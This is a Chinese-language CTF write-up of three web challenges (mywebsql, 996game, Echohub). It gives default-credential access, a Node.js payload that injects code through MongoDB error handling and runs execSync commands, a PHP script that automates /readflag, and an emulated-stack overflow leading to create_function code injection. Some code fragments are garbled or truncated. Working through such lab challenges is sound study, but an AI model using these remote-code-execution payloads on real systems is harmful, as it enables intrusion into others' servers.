## Web
### mywebsql
直接用admin / admin进后台，使用以下方式来GetShell。  
之后阻碍就是`readflag`，脚本处理。还是第一次看见`readflag`成为最大阻碍的CTF题……
     array("pipe", "rw"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w"),
        ];
        $pipes = [];
        $process = \proc_open($cmd, $descriptors, $pipes, __DIR__);
        $stderr = '';
        $stdout = '';
        if (\is_resource($process)) {
            stream_set_blocking($pipes[2], FALSE);
            stream_set_blocking($pipes[1], FALSE);
            while (true) {
                if (!feof($pipes[1])) {
                    $a = fgetc($pipes[1]);
                    if ($a !== false) {
                        $stdout .= $a;
                        if (preg_match("/input your answer:/", $stdout)) {
                            $stdout = explode("first", $stdout)[1];
                            $stdout = explode("input", $stdout)[0];
                            $ret = eval('return ' . $stdout . ';');
                            echo $ret;
                            fwrite($pipes[0], $ret . "\r\n");
                            fflush($pipes[0]);
                            fclose($pipes[0]);
                        }
                    }
                }
                if (feof($pipes[2]) && feof($pipes[1])) {
                    break;
                }
            }
            \fclose($pipes[1]);
            \fclose($pipes[2]);
            $status = \proc_close($process);
        }
        return [$stdout, $stderr, $status];
    }
    var_dump(runCommand('/readflag'));
### 996game
根据提示，得到游戏源码 
。发现其`js/client`直接暴露在公网，猜测`js/server`也同样可静态访问。之后直接down整站源码进行对比。
（右侧的代码因为我已经修改过，因此和原始代码不一样，懒得找原始的了）
那我们现在的目的就是让MongoDB报错，执行`err.message`里的代码了。（虽然感觉好无聊）
观察代码：
    GameServer.loadPlayer = function(socket,id){
      GameServer.server.db.collection('players').findOne({_id: new ObjectId(id)},function(err,doc){
通过`loadPlayer`可触发，唯一可控的点只有id。在前端，`loadPlayer`是点击“Play”时提交到服务器的，参数来源是`localStorage`。直接随便改改`localStorage.playerID`，就可以触发服务器报错。只是触发点不在回调里，而在`new
ObjectId`里。  
反正现在也不知道干啥，先绕过这个`ObjectID`的验证吧，看看能不能传string以外的东西，绕了以后再研究怎么让MongoDB报错。
先想办法发送任意数据。在控制台输入以下代码后“Start Game”即可解决。
    Client.getPlayerID =  () => ('0123456789ab')
    `
阅读代码：
要绕过的第一个点在`var valid = ObjectID.isValid(id);`。往下拉，可发现
    if(id.toHexString) {
        return id.id.length == 12 || (id.id.length == 24 && checkForHexRegExp.test(id.id));
      }
因此构造payload:
    Client.getPlayerID =  () => ({ toHexString: 'aaa', id: {length: 12} })
之后会发现在序列化时出错：
具体代码：
    for (var i = 0; i  ({ toHexString: 'aaa', length: 0, id: {length: 12} })
这样就可以传任意Object了，但是对如何报错还是没有头绪。根据主办方给的提示
    db.a.find({"b":{"$gt":1,"c":"d"}})
得知，MongoDB解析Token时，内置的操作符必须放在最前面；在内置操作符之后的任何Key都无法被识别导致报错。由此构造Payload：
    Client.getPlayerID =  () => ({ "$gt":1,"socket.emit(require('child_process').execSync('ls'))":"bb", toHexString: 'aaa', length: 0, id: {length: 12}})
发现这样就可以ls了。下一步是绕`readflag`……Nodejs的流处理这种事情有点麻烦，用Perl来搞合适些。直接抄了个脚本：
最终Payload：
    Client.getPlayerID =  () => ({ "$gt":1,[`process.chdir('/');socket.emit('aaa');socket.emit(require('child_process').execSync('perl -e \\'use warnings;use strict;use IPC'+String.fromCharCode(58)+String.fromCharCode(58)+'Open2;$| = 1;chdir("/");my $pid = open2(\*out2, \*in2, "./readflag") or die;my $reply = ;print STDOUT $reply; $reply = ;print STDOUT $reply; my $answer = eval($reply);print in2 " $answer "; in2->flush();$reply = ;print STDOUT $reply;print STDOUT $reply;print STDOUT $reply;print STDOUT $reply;\\'').toString('utf-8'))`]:"bb", toHexString: 'aaa', length: 0, id: {length: 12}})
### Echohub
首先先进行PHP解密，解密后的代码：
     0x0, 'ebp' => 0x0, 'esp' => 0x0, 'eip' => 0x0);
    function aslr(&$a, $O0O)
    {
        $a = $a + 0x60000000 + INS_OFFSET + 0x1;
    }
    $func_ = array_flip($func);
    array_walk($func_, 'aslr');
    $plt = array_flip($func_);
    function handle_data($data)
    {
        $len = strlen($data);
        $a = $len / 0x4 + 0x1 * ($len % 0x4);
        $ret = str_split($data, 0x4);
        $ret[$a - 0x1] = str_pad($ret[$a - 0x1], 0x4, "\x00");
        foreach ($ret as $key => &$value) {
             $value = strrev(bin2hex($value));
        }
        return $ret;
    }
    function gen_canary()
    {
        $canary = 'abcdefghijklmnopqrstuvwxyzABCDEFGHJKLMNPQEST123456789';
        $a = $canary[rand(0, strlen($canary) - 0x1)];
        $b = $canary[rand(0, strlen($canary) - 0x1)];
        $c = $canary[rand(0, strlen($canary) - 0x1)];
        $d = "\x00";
        return handle_data($a . $b . $c . $d)[0];
    }
    $canary = gen_canary();
    $canarycheck = $canary;
    function check_canary()
    {
        global $canary;
        global $canarycheck;
        if ($canary != $canarycheck) {
            die('emmmmmm...Don\'t attack me!');
        }
    }
    class stack
    {
        private $ebp, $stack, $esp;
        public function __construct($a, $b)
        {
            $this->stack = array();
            global $regs;
            $this->ebp =& $regs['ebp'];
            $this->esp =& $regs['esp'];
            $this->ebp = 0xfffe0000 + rand(0x0, 0xffff);
            global $canary;
            $this->stack[$this->ebp - 0x4] =& $canary;
            $this->stack[$this->ebp] = $this->ebp + rand(0x0, 0xffff);
            $this->esp = $this->ebp - rand(0x20, 0x60) * 0x4;
            $this->stack[$this->ebp + 0x4] = dechex($a);
            if ($b != NULL) {
                $this->pushdata($b);
            }
        }
        public function pushdata($data)
        {
            $data = handle_data($data);
            for ($i = 0; $i stack[$this->esp + $i * 0x4] = $data[$i];
                //no args in my stack haha
                check_canary();
            }
        }
        public function recover_data($data)
        {
            return hex2bin(strrev($data));
        }
        public function outputdata()
        {
            global $regs;
            echo 'root says: ';
            while (0x1) {
                if ($this->esp == $this->ebp - 0x4) {
                    break;
                }
                $this->pop('eax');
                $data = $this->recover_data($regs['eax']);
                $ret = explode("\x00", $data);
                echo $ret[0];
                if (count($ret) > 0x1) {
                    break;
                }
            }
        }
        public function ret()
        {
            $this->esp = $this->ebp;
            $this->pop('ebp');
            $this->pop('eip');
            $this->call();
        }
        public function get_data_from_reg($item)
        {
            global $regs;
            $a = $this->recover_data($regs[$item]);
            $b = explode("\x00", $a);
            return $b[0];
        }
        public function call()
        {
            global $regs;
            global $plt;
            $a = hexdec($regs['eip']);
            if (isset($_REQUEST[$a])) {
                $this->pop('eax');
                $len = (int) $this->get_data_from_reg('eax');
                $args = array();
                for ($i = 0; $i pop('eax');
                    $data = $this->get_data_from_reg('eax');
                    array_push($args, $_REQUEST[$data]);
                }
                call_user_func_array($plt[$a], $args);
            } else {
                call_user_func($plt[$a]);
            }
        }
        public function push($item)
        {
            global $regs;
            $data = $regs[$item];
            if (hex2bin(strrev($data)) == NULL) {
                die('data error');
            }
            $this->stack[$this->esp] = $data;
            $this->esp -= 0x4;
        }
        public function pop($item)
        {
            global $regs;
            $regs[$item] = $this->stack[$this->esp];
            $this->esp += 0x4;
        }
        public function __call($name, $args)
        {
            check_canary();
        }
    }
    print_R('O0OO0');
    print_R('stack');
    if (isset($_POST['data'])) {
        $phpinfo_addr = array_search('phpinfo', $plt);
        $gets = $_POST['data'];
        $main_stack = new stack($phpinfo_addr, $gets);
        echo '--------------------output---------------------';
        $main_stack->outputdata();
        echo '------------------phpinfo()------------------';
        $main_stack->ret();
    }
一看是个栈溢出，还带ASLR和Canary。从执行点看，应该溢出到`call_user_func_array`。根据phpinfo禁用的函数+PHP
7.3的版本，基本只能使用`create_function`配合代码注入来进行任意代码执行。
代码注入：
disable_functions：  
`file_get_contents,file_put_contents,fwrite,file,chmod,chown,copy,link,fflush,mkdir,popen,rename,touch,unlink,pcntl_alarm,move_upload_file,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,fsockopen,pfsockopen,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,curl_init,curl_exec,curl_multi_init,curl_multi_exec,dba_open,dba_popen,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,dl,putenv`
溢出脚本如下，直接php -S来跑，将其作为代理来打服务器：
     0x0, 'ebp' => 0x0, 'esp' => 0x0, 'eip' => 0x0);
    function aslr(&$a, $O0O)
    {
        $a = $a + 0x60000000 + INS_OFFSET + 0x1;
    }
    $func = get_defined_functions()["internal"];
    $func_ = array_flip($func);
    array_walk($func_, 'aslr');
    $plt = array_flip($func_);
    //var_dump($plt);
    function handle_data($data)
    {
        $len = strlen($data);
        $a = $len / 0x4 + 0x1 * ($len % 0x4);
        $ret = str_split($data, 0x4);
        $ret[$a - 0x1] = str_pad($ret[$a - 0x1], 0x4, "\x00");
        foreach ($ret as $key => &$value) {
            $value = strrev(bin2hex($value));
        }
        return $ret;
    }
    function gen_canary()
    {
        $canary = 'abcdefghijklmnopqrstuvwxyzABCDEFGHJKLMNPQEST123456789';
        $a = $canary[rand(0, strlen($canary) - 0x1)];
        $b = $canary[rand(0, strlen($canary) - 0x1)];
        $c = $canary[rand(0, strlen($canary) - 0x1)];
        $d = "\x00";
        return handle_data($a . $b . $c . $d)[0];
    }
    function recover_data($data)
    {
        return hex2bin(strrev($data));
    }
    $canary = gen_canary();
    $phpinfo_addr = array_search('phpinfo', $plt);
    $stack = array();
    $ebp =& $regs['ebp'];
    $esp =& $regs['esp'];
        $rand1 = rand(0x0, 0xffff);
    $ebp = 0xfffe0000 + $rand1;
    $stack[$ebp - 0x4] =& $canary;
        $rand2 = rand(0x0, 0xffff);